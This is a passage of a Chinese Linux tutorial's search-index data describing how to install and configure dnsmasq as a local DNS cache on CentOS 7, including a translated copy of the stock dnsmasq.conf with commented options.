\u5e76\u63a5\u7ba1\u4efb\u4f55\u5728\u7f51\u7edc\u4e0a\u5e7f\u64ad\u7684\u5ba2\u6237\u7aef\u7684\u79df\u7ea6\uff0c # \u65e0\u8bba\u5b83\u662f\u5426\u6709\u8be5\u79df\u7ea6\u7684\u8bb0\u5f55\u3002\u8fd9\u907f\u514d\u4e86\u5f53\u4e00\u53f0\u673a\u5668 # \u5728\u65b0\u7f51\u7edc\u4e0a\u5524\u9192\u65f6\u7684\u957f\u65f6\u95f4\u8d85\u65f6\u3002\u5982\u679c\u6709 # \u4efb\u4f55\u53ef\u80fd\u4f60\u6700\u7ec8\u4e0d\u5c0f\u5fc3\u4e3a\u4f60\u7684\u6821\u56ed/\u516c\u53f8\u914d\u7f6e\u4e86\u4e00\u4e2aDHCP\u670d\u52a1\u5668\uff0c # \u5219\u4e0d\u8981\u542f\u7528\u6b64\u529f\u80fd\u3002ISC\u670d\u52a1\u5668\u4f7f\u7528 # \u76f8\u540c\u7684\u9009\u9879\uff0c\u8fd9\u4e2aURL\u63d0\u4f9b\u4e86\u66f4\u591a\u4fe1\u606f\uff1a # http://www.isc.org/files/auth.html #dhcp-authoritative # \u5c06DHCP\u670d\u52a1\u5668\u8bbe\u7f6e\u4e3a\u6839\u636eRFC 4039\u542f\u7528DHCPv4 Rapid Commit\u9009\u9879\u3002 # \u5728\u8fd9\u79cd\u6a21\u5f0f\u4e0b\uff0c\u5b83\u5c06\u54cd\u5e94\u5305\u542bRapid Commit\u9009\u9879\u7684DHCPDISCOVER\u6d88\u606f # \u7528\u4e00\u4e2a\u5305\u542bRapid Commit\u9009\u9879\u548c\u5b8c\u5168\u63d0\u4ea4\u7684\u5730\u5740\u548c\u914d\u7f6e\u4fe1\u606f\u7684DHCPACK\u3002 # \u4ec5\u5f53\u670d\u52a1\u5668\u662f\u5b50\u7f51\u7684\u552f\u4e00\u670d\u52a1\u5668\uff0c\u6216\u8005\u591a\u4e2a\u670d\u52a1\u5668\u5b58\u5728\u5e76\u4e14\u5b83\u4eec\u6bcf\u4e2a\u90fd # \u4e3a\u6240\u6709\u5ba2\u6237\u7aef\u63d0\u4ea4\u7ed1\u5b9a\u65f6\uff0c\u624d\u80fd\u542f\u7528\u6b64\u6a21\u5f0f\u3002 #dhcp-rapid-commit # \u5728\u521b\u5efa\u6216\u9500\u6bc1DHCP\u79df\u7ea6\u65f6\u8fd0\u884c\u4e00\u4e2a\u53ef\u6267\u884c\u6587\u4ef6\u3002 # \u53d1\u9001\u5230\u811a\u672c\u7684\u53c2\u6570\u662f \"add\" \u6216 \"del\", # \u7136\u540e\u662fMAC\u5730\u5740\uff0cIP\u5730\u5740\uff0c\u6700\u540e\u662f\u4e3b\u673a\u540d # \u5982\u679c\u6709\u7684\u8bdd\u3002 #dhcp-script=/bin/echo # \u5728\u8fd9\u91cc\u8bbe\u7f6e\u7f13\u5b58\u5927\u5c0f\u3002 cache-size=1500 # \u5982\u679c\u4f60\u60f3\u7981\u7528\u8d1f\u7f13\u5b58\uff0c\u53d6\u6d88\u6ce8\u91ca\u8fd9\u4e00\u884c\u3002 #no-negcache # \u901a\u5e38\u6765\u81ea/etc/hosts\u548cDHCP\u79df\u7ea6\u6587\u4ef6\u7684\u54cd\u5e94 # \u6709\u751f\u5b58\u65f6\u95f4\u8bbe\u7f6e\u4e3a\u96f6\uff0c\u4f20\u7edf\u4e0a\u610f\u5473\u7740 # \u4e0d\u8fdb\u4e00\u6b65\u7f13\u5b58\u3002\u5982\u679c\u4f60\u613f\u610f\u4e3a\u4e86\u51cf\u8f7b\u670d\u52a1\u5668\u8d1f\u8f7d # \u4ea4\u6362\u6f5c\u5728\u7684\u9648\u65e7\u6570\u636e\uff0c\u4f60\u53ef\u4ee5\u5728\u8fd9\u91cc\u8bbe\u7f6e\u4e00\u4e2a\u751f\u5b58\u65f6\u95f4\uff08\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09\u3002 #local-ttl= # \u5982\u679c\u4f60\u5e0c\u671bdnsmasq\u68c0\u6d4bVerisign\u4f01\u56fe\u53d1\u9001\u67e5\u8be2 # \u5230\u672a\u6ce8\u518c\u7684.com\u548c.net\u4e3b\u673a\u5230\u5176sitefinder\u670d\u52a1\uff0c\u5e76\u4e14\u8ba9 # dnsmasq\u53cd\u800c\u8fd4\u56de\u6b63\u786e\u7684NXDOMAIN\u54cd\u5e94\uff0c\u53d6\u6d88\u6ce8\u91ca # \u8fd9\u4e00\u884c\u3002\u4f60\u53ef\u4ee5\u6dfb\u52a0\u7c7b\u4f3c\u7684\u884c\u6765\u505a\u540c\u6837\u7684\u4e8b\u60c5 # \u5bf9\u4e8e\u5b9e\u73b0\u4e86\u901a\u914d\u7b26A\u8bb0\u5f55\u7684\u5176\u4ed6\u6ce8\u518c\u673a\u6784\u3002 #bogus-nxdomain=64.94.110.11 # \u5982\u679c\u4f60\u60f3\u8981\u4fee\u6b63\u6765\u81ea\u4e0a\u6e38\u670d\u52a1\u5668\u7684DNS\u7ed3\u679c\uff0c\u4f7f\u7528 # alias\u9009\u9879\u3002\u8fd9\u53ea\u9002\u7528\u4e8eIPv4\u3002 # \u8fd9\u4e2a\u522b\u540d\u4f7f1.2.3.4\u7684\u7ed3\u679c\u51fa\u73b0\u4e3a5.6.7.8 #alias=1.2.3.4,5.6.7.8 # \u8fd9\u5c06\u6620\u5c041.2.3.x\u52305.6.7.x #alias=1.2.3.0,5.6.7.0,255.255.255.0 # \u8fd9\u5c06\u6620\u5c04192.168.0.10-192.168.0.40\u523010.0.0.10-10.0.0.40 #alias=192.168.0.10-192.168.0.40,10.0.0.0,255.255.255.0 # \u66f4\u6539\u4ee5\u4e0b\u884c\uff0c\u5982\u679c\u4f60\u5e0c\u671bdnsmasq\u63d0\u4f9bMX\u8bb0\u5f55\u3002 # \u8fd4\u56de\u540d\u4e3a \"maildomain.com\" \u7684MX\u8bb0\u5f55\uff0c\u76ee\u6807 # \u670d\u52a1\u5668\u4e3a servermachine.com \u548c\u4f18\u5148\u7ea7\u4e3a 50 #mx-host=maildomain.com,servermachine.com,50 # \u8bbe\u7f6e\u4f7f\u7528localmx\u9009\u9879\u521b\u5efa\u7684MX\u8bb0\u5f55\u7684\u9ed8\u8ba4\u76ee\u6807\u3002 #mx-target=servermachine.com # \u8fd4\u56de\u6307\u5411mx-target\u7684MX\u8bb0\u5f55\u7ed9\u6240\u6709\u672c\u5730 # \u673a\u5668\u3002 #localmx # \u8fd4\u56de\u4e00\u4e2a\u6307\u5411\u81ea\u8eab\u7684MX\u8bb0\u5f55\u7ed9\u6240\u6709\u672c\u5730\u673a\u5668\u3002 #selfmx # \u66f4\u6539\u4ee5\u4e0b\u884c\uff0c\u5982\u679c\u4f60\u5e0c\u671bdnsmasq\u63d0\u4f9bSRV # \u8bb0\u5f55\u3002\u8fd9\u4e9b\u5728\u4f60\u5e0c\u671b\u4e3a # Active Directory\u548c\u5176\u4ed6windows\u8d77\u6e90\u7684DNS\u8bf7\u6c42\u670d\u52a1ldap\u65f6\u5f88\u6709\u7528\u3002 # \u53c2\u89c1RFC 2782\u3002 # \u4f60\u53ef\u4ee5\u6dfb\u52a0\u591a\u4e2asrv-host\u884c\u3002 # \u5b57\u6bb5\u662f<name>,<target>,<port>,<priority>,<weight> # \u5982\u679c\u540d\u5b57\u90e8\u5206\u7f3a\u5c11\u57df\uff08\u6240\u4ee5\u5b83\u53ea\u6709\u670d\u52a1\u548c\u534f\u8bae\u90e8\u5206\uff09 # \u90a3\u4e48\u4f7f\u7528domain=\u914d\u7f6e\u9009\u9879\u7ed9\u51fa\u7684\u57df\u3002\uff08\u6ce8\u610fexpand-hosts\u4e0d\u9700\u8981 # \u8bbe\u7f6e\u4e3a\u8fd9\u4e2a\u5de5\u4f5c\u3002\uff09 # \u4e00\u4e2aSRV\u8bb0\u5f55\uff0c\u4e3aexample.com\u57df\u53d1\u9001LDAP\u5230 # ldapserver.example.com\u7aef\u53e3389 #srv-host=_ldap._tcp.example.com,ldapserver.example.com,389 # \u4e00\u4e2aSRV\u8bb0\u5f55\uff0c\u4f7f\u7528domain=\u53d1\u9001LDAP\u4e3aexample.com\u57df\u5230 # ldapserver.example.com\u7aef\u53e3389 #domain=example.com #srv-host=_ldap._tcp,ldapserver.example.com,389 # \u4e24\u4e2aLDAP\u7684SRV\u8bb0\u5f55\uff0c\u6bcf\u4e2a\u6709\u4e0d\u540c\u7684\u4f18\u5148\u7ea7 #srv-host=_ldap._tcp.example.com,ldapserver.example.com,389,1 #srv-host=_ldap._tcp.example.com,ldapserver.example.com,389,2 # \u4e00\u4e2aSRV\u8bb0\u5f55\u6307\u793aexample.com\u57df\u6ca1\u6709LDAP\u670d\u52a1\u5668 #srv-host=_ldap._tcp.example.com # \u4e0b\u9762\u7684\u884c\u663e\u793a\u5982\u4f55\u4f7fdnsmasq\u63d0\u4f9b\u4e00\u4e2a\u4efb\u610f\u7684PTR # \u8bb0\u5f55\u3002\u8fd9\u5bf9DNS-SD\u5f88\u6709\u7528\u3002\uff08\u6ce8\u610f # \u4e3aSRV\u8bb0\u5f55\u5b8c\u6210\u7684\u57df\u540d\u6269\u5c55 _does_not # \u53d1\u751f\u5728PTR\u8bb0\u5f55\u4e0a\u3002\uff09 #ptr-record=_http._tcp.dns-sd-services,\"New Employee Page._http._tcp.dns-sd-services\" # \u66f4\u6539\u4ee5\u4e0b\u884c\uff0c\u5982\u679c\u4f60\u5e0c\u671bdnsm# asq\u63d0\u4f9bTXT\u8bb0\u5f55\u3002 # \u8fd9\u4e9b\u7528\u4e8e\u50cfSPF\u548czeroconf\u8fd9\u6837\u7684\u4e1c\u897f\u3002\uff08\u6ce8\u610f # \u4e3aSRV\u8bb0\u5f55\u5b8c\u6210\u7684\u57df\u540d\u6269\u5c55 _does_not # \u53d1\u751f\u5728TXT\u8bb0\u5f55\u4e0a\u3002\uff09 # \u793a\u4f8bSPF\u3002 #txt-record=example.com,\"v=spf1 a -all\" # \u793a\u4f8bzeroconf #txt-record=_http._tcp.example.com,name=value,paper=A4 # \u4e3a\u4e00\u4e2a\u201c\u672c\u5730\u201dDNS\u540d\u79f0\u63d0\u4f9b\u522b\u540d\u3002\u6ce8\u610f\u8fd9 _only_ \u5bf9\u4e8e # \u76ee\u6807\u662f\u6765\u81eaDHCP\u6216/etc/hosts\u7684\u540d\u79f0\u6709\u6548\u3002\u7ed9\u4e3b\u673a # \"bert\" \u53e6\u4e00\u4e2a\u540d\u5b57\uff0cbertrand #cname=bertand,bert # \u4e3a\u4e86\u8c03\u8bd5\u76ee\u7684\uff0c\u8bb0\u5f55\u6bcf\u4e2a\u901a\u8fc7 # dnsmasq\u7684DNS\u67e5\u8be2\u3002 log-queries # \u65e5\u5fd7\u6587\u4ef6\u4f4d\u7f6e\u3002 log-facility=/var/log/dnsmasq.log # \u8bb0\u5f55\u6709\u5173DHCP\u4ea4\u6613\u7684\u5927\u91cf\u989d\u5916\u4fe1\u606f\u3002 #log-dhcp # \u5305\u542b\u53e6\u4e00\u7ec4\u914d\u7f6e\u9009\u9879\u3002 #conf-file=/etc/dnsmasq.more.conf #conf-dir=/etc/dnsmasq.d # \u5305\u542b\u4e00\u4e2a\u76ee\u5f55\u4e2d\u7684\u6240\u6709\u6587\u4ef6\uff0c\u9664\u4e86\u4ee5.bak\u7ed3\u5c3e\u7684\u6587\u4ef6 #conf-dir=/etc/dnsmasq.d,.bak # \u5305\u542b\u4e00\u4e2a\u76ee\u5f55\u4e2d\u6240\u6709\u4ee5.conf\u7ed3\u5c3e\u7684\u6587\u4ef6 #conf-dir=/etc/dnsmasq.d/,*.conf # \u5305\u542b/etc/dnsmasq.d\u4e2d\u7684\u6240\u6709\u6587\u4ef6\uff0c\u9664\u4e86RPM\u5907\u4efd\u6587\u4ef6 conf-dir=/etc/dnsmasq.d,.rpmnew,.rpmsave,.rpmorig # \u5982\u679c\u4e00\u4e2aDHCP\u5ba2\u6237\u7aef\u58f0\u79f0\u5b83\u7684\u540d\u5b57\u662f\"wpad\"\uff0c\u5ffd\u7565\u5b83\u3002 # \u8fd9\u4fee\u590d\u4e86\u4e00\u4e2a\u5b89\u5168\u6f0f\u6d1e\u3002\u8bf7\u53c2\u9605CERT\u6f0f\u6d1eVU#598349 #dhcp-name-match=set:wpad-ignore,wpad #dhcp-ignore-names=tag:wpad-ignore","title":"DNS\u7f13\u5b58"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/DNS%E7%BC%93%E5%AD%98/#dnsmasq","text":"\u6253\u5f00\u7ec8\u7aef\u3002 \u4f7f\u7528\u4ee5\u4e0b\u547d\u4ee4\u5b89\u88c5 dnsmasq \uff1a sudo yum install dnsmasq","title":"\u5b89\u88c5 dnsmasq"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/DNS%E7%BC%93%E5%AD%98/#dnsmasq_1","text":"\u5b89\u88c5\u5b8c\u6210\u540e\uff0c\u7f16\u8f91 dnsmasq \u7684\u914d\u7f6e\u6587\u4ef6\u3002\u4f7f\u7528\u4f60\u559c\u6b22\u7684\u6587\u672c\u7f16\u8f91\u5668\u6253\u5f00 /etc/dnsmasq.conf \uff0c\u4f8b\u5982\uff1a sudo vi /etc/dnsmasq.conf \u5728\u914d\u7f6e\u6587\u4ef6\u4e2d\u6dfb\u52a0\u6216\u4fee\u6539\u4ee5\u4e0b\u884c\u6765\u542f\u7528 DNS \u7f13\u5b58\uff1a # \u542f\u7528 DNS \u7f13\u5b58\u529f\u80fd cache-size=1000 # \u6dfb\u52a0\u6216\u53d6\u6d88\u6ce8\u91ca\u4ee5\u4e0b\u884c\u6765\u542f\u7528\u65e5\u5fd7\u8bb0\u5f55\uff1a log-queries log-facility=/var/log/dnsmasq.log # min-cache-ttl \uff1a\u8fd9\u4e2a\u8bbe\u7f6e\u6307\u5b9a\u4e86\u7f13\u5b58\u6761\u76ee\u7684\u6700\u5c0fTTL\u503c\uff08\u4ee5\u79d2\u4e3a\u5355\u4f4d\uff09\u3002\u5f53\u4ece\u4e0a\u6e38DNS\u670d\u52a1\u5668\u63a5\u6536\u5230\u7684TTL\u503c\u4f4e\u4e8e\u6b64\u8bbe\u7f6e\u65f6\uff0c`dnsmasq` \u4f1a\u81ea\u52a8\u5c06TTL\u8c03\u6574\u5230\u8fd9\u4e2a\u6700\u5c0f\u503c\u3002\u8fd9\u53ef\u4ee5\u9632\u6b62\u67d0\u4e9b\u52a8\u6001DNS\u914d\u7f6e\u8fc7\u4e8e\u9891\u7e41\u5730\u5bfc\u81f4\u7f13\u5b58\u5931\u6548\u3002 min-cache-ttl=300 # max-cache-ttl \uff1a\u8fd9\u4e2a\u8bbe\u7f6e\u6307\u5b9a\u4e86\u7f13\u5b58\u6761\u76ee\u7684\u6700\u5927TTL\u503c\u3002\u8fd9\u5bf9\u4e8e\u9650\u5236\u957f\u65f6\u95f4\u5b58\u50a8\u7f13\u5b58\u6761\u76ee\u7279\u522b\u6709\u7528\uff0c\u53ef\u4ee5\u9632\u6b62\u8fc7\u65f6\u7684DNS\u4fe1\u606f\u957f\u65f6\u95f4\u4fdd\u7559\u5728\u7f13\u5b58\u4e2d\u3002 max-cache-ttl=3600 \u8fd9\u91cc\u7684 cache-size=1000 \u8868\u793a\u7f13\u5b58\u5927\u5c0f\uff0c\u4f60\u53ef\u4ee5\u6839\u636e\u9700\u8981\u8c03\u6574\u8fd9\u4e2a\u503c\u3002","title":"\u914d\u7f6e dnsmasq"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/DNS%E7%BC%93%E5%AD%98/#dnsmasq-dns","text":"\u4e3a\u4e86\u8ba9\u7cfb\u7edf\u901a\u8fc7 dnsmasq \u89e3\u6790\u6240\u6709 DNS \u8bf7\u6c42\uff0c\u9700\u8981\u66f4\u6539\u7cfb\u7edf\u7684 DNS \u8bbe\u7f6e\u3002\u7f16\u8f91 /etc/resolv.conf \u6587\u4ef6\uff1a sudo vi /etc/resolv.conf \u4fee\u6539\u6216\u6dfb\u52a0\u4ee5\u4e0b\u884c\uff0c\u8bbe\u7f6e dnsmasq \u4f5c\u4e3a\u672c\u5730 DNS \u89e3\u6790\u5668\uff08\u786e\u4fdd\u8fd9\u662f\u6587\u4ef6\u4e2d\u7684\u7b2c\u4e00\u884c\uff09\uff1a nameserver 127.0.0.1","title":"\u8bbe\u7f6e dnsmasq \u4e3a\u7cfb\u7edf\u7684 DNS \u670d\u52a1"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/DNS%E7%BC%93%E5%AD%98/#dnsmasq_2","text":"\u542f\u52a8 dnsmasq \u670d\u52a1\uff1a sudo systemctl start dnsmasq \u8bbe\u7f6e dnsmasq \u670d\u52a1\u5f00\u673a\u81ea\u542f\uff1a sudo systemctl enable dnsmasq","title":"\u542f\u52a8 dnsmasq \u670d\u52a1"},{"location":"system/linux/%E7%BD%91%E7%BB%9C/DNS%E7%BC%93%E5%AD%98/#_1","text":"\u4f7f\u7528 dig \u6216 nslookup \u547d\u4ee4\u6d4b\u8bd5 DNS \u89e3\u6790\u662f\u5426\u6b63\u5e38\uff1a dig example.com \u7b2c\u4e00\u6b21\u67e5\u8be2\u4f1a\u7a0d\u6162\uff0c\u56e0\u4e3a dnsmasq \u9700\u8981\u4ece\u4e0a\u6e38 DNS \u670d\u52a1\u5668\u83b7\u53d6\u6570\u636e\u5e76\u7f13\u5b58\u3002\u4e4b\u540e\u7684\u67e5\u8be2\u5e94\u8be5\u4f1a\u660e\u663e\u5feb\u5f88\u591a\uff0c\u56e0\u4e3a\u6570\u636e\u4f1a\u4ece\u672c\u5730\u7f13\u5b58\u4e2d\u83b7\u53d6\u3002 \u5982\u679c\u4ece\u7f13\u5b58\u4e2d\u67e5\u8be2\u5230\u4e86\u5730\u5740\uff0c\u90a3\u4e48\u5c31\u4f1a\u7f13\u5b58\u88ab\u547d\u4e2d # sudo grep \"cached\" /var/log/dnsmasq.log Apr 28 19:08:54 dnsmasq[4061579]: cached www.baidu.com is <CNAME> \u8fd9\u6837\uff0c\u4f60\u5c31\u6210\u529f\u5728 CentOS 7 \u7cfb\u7edf\u4e0a\u8bbe\u7f6e\u4e86 DNS \u7f13\u5b58\uff0c\u5e94\u8be5\u80fd\u6709\u6548\u63d0\u9ad8\u57df\u540d\u89e3\u6790\u7684\u901f\u5ea6\u548c\u6548\u7387\u3002\u5982\u679c\u4f60\u9047\u5230\u4efb\u4f55\u95ee\u9898\uff0c\u53ef\u4ee5\u91cd\u67e5\u914d\u7f6e\u6216\u68c0\u67e5 dnsmasq \u7684\u72b6\u6001\u548c\u65e5\u5fd7\u4ee5\u786e\u4fdd\u4e00\u5207\u6b63\u5e38\u8fd0\u884c\u3002 \u4e0b\u9762\u662f dnsmasq \u914d\u7f6e\u6587\u4ef6\u7684\u683c\u5f0f\u4fdd\u6301\u4e0d\u53d8\u7684\u7ffb\u8bd1\uff1a # dnsmasq\u7684\u914d\u7f6e\u6587\u4ef6\u3002 # # \u683c\u5f0f\u4e3a\u6bcf\u884c\u4e00\u4e2a\u9009\u9879\uff0c\u6709\u6548\u9009\u9879\u4e0e\u547d\u4ee4\u884c\u4e0a\u7684\u957f\u9009\u9879\u76f8\u540c\u3002\u8be6\u60c5\u89c1 # \"/usr/sbin/dnsmasq --help\" \u6216 \"man 8 dnsmasq\"\u3002 # \u5728\u6807\u51c6DNS\u7aef\u53e3\uff0853\uff09\u4e4b\u5916\u7684\u7279\u5b9a\u7aef\u53e3\u4e0a\u76d1\u542c # \uff0853\uff09\u3002\u5c06\u6b64\u8bbe\u7f6e\u4e3a\u96f6\u4f1a\u5b8c\u5168\u7981\u7528DNS\u529f\u80fd\uff0c # \u4ec5\u7559\u4e0bDHCP\u548c/\u6216TFTP\u3002 #port=5353 # \u4e0b\u9762\u4e24\u4e2a\u9009\u9879\u4f7f\u4f60\u6210\u4e3a\u4e00\u4e2a\u66f4\u597d\u7684\u7f51\u7edc\u516c\u6c11\uff0c\u56e0\u4e3a\u5b83\u4eec # \u544a\u8bc9dnsmasq\u8fc7\u6ee4\u6389\u516c\u5171DNS\u65e0\u6cd5\u56de\u7b54\u7684\u67e5\u8be2\uff0c # \u5e76\u4e14\u4e0d\u5fc5\u8981\u5730\u52a0\u8f7d\u670d\u52a1\u5668\uff08\u5c24\u5176\u662f\u6839\u670d\u52a1\u5668\uff09\u3002 # \u5982\u679c\u4f60\u6709\u6309\u9700\u62e8\u53f7\u8fde\u63a5\uff0c\u5b83\u4eec\u8fd8\u80fd\u963b\u6b62 # \u8fd9\u4e9b\u8bf7\u6c42\u4e0d\u5fc5\u8981\u5730\u5efa\u7acb\u8fde\u63a5\u3002 # \u4ece\u4e0d\u8f6c\u53d1\u6ca1\u6709\u70b9\u6216\u57df\u90e8\u5206\u7684\u7eaf\u540d\u79f0 #domain-needed # \u4ece\u4e0d\u8f6c\u53d1\u975e\u8def\u7531\u5730\u5740\u7a7a\u95f4\u4e2d\u7684\u5730\u5740\u3002 #bogus-priv # \u53d6\u6d88\u6ce8\u91ca\u8fd9\u4e9b\u4ee5\u542f\u7528DNSSEC\u9a8c\u8bc1\u548c\u7f13\u5b58\uff1a # (\u9700\u8981dnsmasq\u7f16\u8bd1\u65f6\u5305\u542bDNSSEC\u9009\u9879\u3002) #conf-file=/usr/share/dnsmasq/trust-anchors.conf #dnssec # \u6ca1\u6709DNSSEC\u7b7e\u540d\u7684\u56de\u590d\u53ef\u80fd\u662f\u5408\u6cd5\u7684\uff0c\u56e0\u4e3a\u8be5\u57df # \u672a\u7b7e\u540d\uff0c\u6216\u53ef\u80fd\u662f\u4f2a\u9020\u7684\u3002\u8bbe\u7f6e\u6b64\u9009\u9879\u544a\u8bc9dnsmasq # \u68c0\u67e5\u672a\u7b7e\u540d\u56de\u590d\u662f\u5426\u53ef\u4ee5\u63a5\u53d7\uff0c\u65b9\u6cd5\u662f\u627e\u5230\u4e00\u4e2a\u5b89\u5168\u8bc1\u660e # \u8868\u660e\u4ece\u6839\u5230\u8be5\u57df\u4e4b\u95f4\u67d0\u5904\u7684DS\u8bb0\u5f55\u4e0d\u5b58\u5728\u3002 # \u8bbe\u7f6e\u6b64\u9879\u7684\u4ee3\u4ef7\u662f\u5373\u4f7f\u5728\u672a\u7b7e\u540d\u7684\u57df\u4e2d\u7684\u67e5\u8be2\u4e5f\u9700\u8981 # \u4e00\u4e2a\u6216\u591a\u4e2a\u989d\u5916\u7684DNS\u67e5\u8be2\u6765\u9a8c\u8bc1\u3002 #dnssec-check-unsigned # \u53d6\u6d88\u6ce8\u91ca\u6b64\u9879\u4ee5\u8fc7\u6ee4\u65e0\u7528\u7684Windows\u8d77\u6e90DNS\u8bf7\u6c42 # \u8fd9\u53ef\u80fd\u65e0\u7f18\u65e0\u6545\u89e6\u53d1\u6309\u9700\u8fde\u63a5\u3002 # \u6ce8\u610f\u8fd9\uff08\u5728\u5176\u4ed6\u4e8b\u9879\u4e2d\uff09\u4f1a\u963b\u585e\u6240\u6709SRV\u8bf7\u6c42\uff0c # \u56e0\u6b64\u5982\u679c\u4f60\u4f7f\u7528\u4f8b\u5982Kerberos, SIP, XMPP\u6216Google-talk\uff0c # \u5219\u4e0d\u8981\u4f7f\u7528\u5b83\u3002 # \u8fd9\u4e2a\u9009\u9879\u4ec5\u5f71\u54cd\u8f6c\u53d1\uff0cSRV\u8bb0\u5f55\u7531 # dnsmasq\uff08\u901a\u8fc7srv-host=\u884c\uff09\u4ea7\u751f\u7684\u4e0d\u53d7\u5176\u5f71\u54cd\u3002 #filterwin2k # \u5982\u679c\u4f60\u5e0c\u671bdns\u4ece\u5176\u4ed6\u5730\u65b9\u83b7\u53d6\u5176\u4e0a\u6e38\u670d\u52a1\u5668 # \u800c\u4e0d\u662f/etc/resolv.conf #resolv-file= # \u9ed8\u8ba4\u60c5\u51b5\u4e0b\uff0cdnsmasq\u4f1a\u5411\u5b83\u6240\u77e5\u9053\u7684\u4efb\u4f55\u4e0a\u6e38 # \u670d\u52a1\u5668\u53d1\u9001\u67e5\u8be2\uff0c\u5e76\u5c1d\u8bd5\u4f18\u5148\u8003\u8651\u5df2\u77e5\u7684 # \u8fd0\u884c\u4e2d\u7684\u670d\u52a1\u5668\u3002\u53d6\u6d88\u6ce8\u91ca\u6b64\u9879\u5f3a\u5236dnsmasq # \u5c1d\u8bd5\u6309/etc/resolv.conf\u4e2d\u51fa\u73b0\u7684\u987a\u5e8f # \u4e25\u683c\u5730\u5bf9\u6bcf\u4e2a\u67e5\u8be2\u7684\u6bcf\u4e2a\u670d\u52a1\u5668\u8fdb\u884c\u5c1d\u8bd5\u3002 #strict-order # \u5982\u679c\u4f60\u4e0d\u5e0c\u671bdnsmasq\u8bfb\u53d6/etc/resolv.conf\u6216\u4efb\u4f55\u5176\u4ed6 # \u6587\u4ef6\uff0c\u800c\u662f\u4ece\u8fd9\u4e2a\u6587\u4ef6\u4e2d\u83b7\u53d6\u5176\u670d\u52a1\u5668\uff08\u89c1\u4e0b\u6587\uff09\uff0c\u90a3\u4e48 # \u53d6\u6d88\u6ce8\u91ca\u8fd9\u4e00\u884c\u3002 #no-resolv # \u5982\u679c\u4f60\u4e0d\u5e0c\u671bdnsmasq\u8f6e\u8be2/etc/resolv.conf\u6216\u5176\u4ed6\u89e3\u6790 # \u6587\u4ef6\u7684\u53d8\u5316\u5e76\u91cd\u65b0\u8bfb\u53d6\u5b83\u4eec\uff0c\u90a3\u4e48\u53d6\u6d88\u6ce8\u91ca\u8fd9\u4e00\u884c\u3002 #no-poll # \u5728\u8fd9\u91cc\u6dfb\u52a0\u5176\u4ed6\u540d\u79f0\u670d\u52a1\u5668\uff0c\u5e26\u6709\u57df\u89c4\u8303\uff0c\u5982\u679c\u5b83\u4eec\u662f\u4e3a # \u975e\u516c\u5171\u57df\u3002 #server=/localnet/192.168.0.1 # \u4f8b\u5b50\uff0c\u5c06PTR\u67e5\u8be2\u8def\u7531\u5230\u540d\u79f0\u670d\u52a1\u5668\uff1a\u8fd9\u4f1a\u53d1\u9001\u6240\u6709 # \u5730\u5740->\u540d\u79f0\u67e5\u8be2192.168.3/24\u5230\u540d\u79f0\u670d\u52a1\u566810.1.2.3 #server=/3.168.192.in-addr.arpa/10.1.2.3 # \u5728\u8fd9\u91cc\u6dfb\u52a0\u4ec5\u672c\u5730\u57df\uff0c\u8fd9\u4e9b\u57df\u7684\u67e5\u8be2 # \u4ece/etc/hosts\u6216DHCP\u4ec5\u56de\u7b54\u67e5\u8be2\u3002 #local=/localnet/ # \u5728\u8fd9\u91cc\u6dfb\u52a0\u4f60\u60f3\u8981\u5f3a\u5236\u8f6c\u5230IP\u5730\u5740\u7684\u57df\u3002 # \u4e0b\u9762\u7684\u4f8b\u5b50\u628adouble-click.net\u7684\u4efb\u4f55\u4e3b\u673a\u90fd\u53d1\u9001\u5230\u4e00\u4e2a\u672c\u5730 # web-server\u3002 #address=/double-click.net/127.0.0.1 # --address (\u548c --server) \u4e5f\u9002\u7528\u4e8eIPv6\u5730\u5740\u3002 #address=/www.thekelleys.org.uk/fe80::20d:60ff:fe36:f83 # \u5c06yahoo.com, google.com\u53ca\u5176\u5b50\u57df\u7684\u6240\u6709\u67e5\u8be2IP # \u6dfb\u52a0\u5230vpn\u548csearch ipsets: #ipset=/yahoo.com/google.com/vpn,search # \u4f60\u53ef\u4ee5\u63a7\u5236dnsmasq\u5982\u4f55\u4e0e\u670d\u52a1\u5668\u5bf9\u8bdd\uff1a\u8fd9\u5f3a\u5236 # \u901a\u8fc7eth1\u8def\u7531\u523010.1.2.3\u7684\u67e5\u8be2 # server=10.1.2.3@eth1 # \u8fd9\u5c06\u8bbe\u7f6e\u4e0e10.1.2.3\u901a\u8bdd\u7684\u6e90\uff08\u5373\u672c\u5730\uff09\u5730\u5740 # \u4e3a192.168.1.1 \u7aef\u53e3 55\uff08\u663e\u7136\uff0c\u673a\u5668\u4e0a\u5fc5\u987b\u6709\u4e00\u4e2a # \u8be5IP\u7684\u63a5\u53e3\uff09\u3002 # server=10.1.2.3@192.168.1.1#55 # \u5982\u679c\u4f60\u5e0c\u671bdnsmasq\u66f4\u6539\u542f\u52a8\u540e\u7684uid\u548cgid # \u4e3a\u5176\u4ed6\u9ed8\u8ba4\u503c\uff0c\u8bf7\u7f16\u8f91\u4ee5\u4e0b\u884c\u3002 user=dnsmasq group=dnsmasq # \u5982\u679c\u4f60\u5e0c\u671bdnsmasq\u4ec5\u5728\u6307\u5b9a\u7684\u63a5\u53e3\u4e0a\u76d1\u542c # DHCP\u548cDNS\u8bf7\u6c42\uff08\u548cloopback\uff09\uff0c\u8bf7\u5728\u8fd9\u91cc\u7ed9\u51fa # \u63a5\u53e3\u7684\u540d\u79f0\uff08\u4f8b\u5982eth0\uff09\u3002 # \u91cd\u590d\u8be5\u884c\u4ee5\u5305\u62ec\u591a\u4e2a\u63a5\u53e3\u3002 #interface= # \u9ed8\u8ba4\u60c5\u51b5\u4e0b\u4ec5\u5728localhost\u4e0a\u76d1\u542c interface=lo # \u6216\u8005\u4f60\u53ef\u4ee5\u6307\u5b9a_\u4e0d_\u76d1\u542c\u7684\u63a5\u53e3 #except-interface= # \u6216\u8005\u901a\u8fc7\u5730\u5740\u6307\u5b9a\u76d1\u542c\u7684\u63a5\u53e3\uff08\u8bb0\u4f4f\u5305\u62ec127.0.0.1 # \u5982\u679c\u4f60\u4f7f\u7528\u8fd9\u4e2a\u3002\uff09 #listen-address= # \u5982\u679c\u4f60\u5e0c\u671bdnsmasq\u4ec5\u5728\u4e00\u4e2a\u63a5\u53e3\u4e0a\u63d0\u4f9bDNS\u670d\u52a1\uff0c # 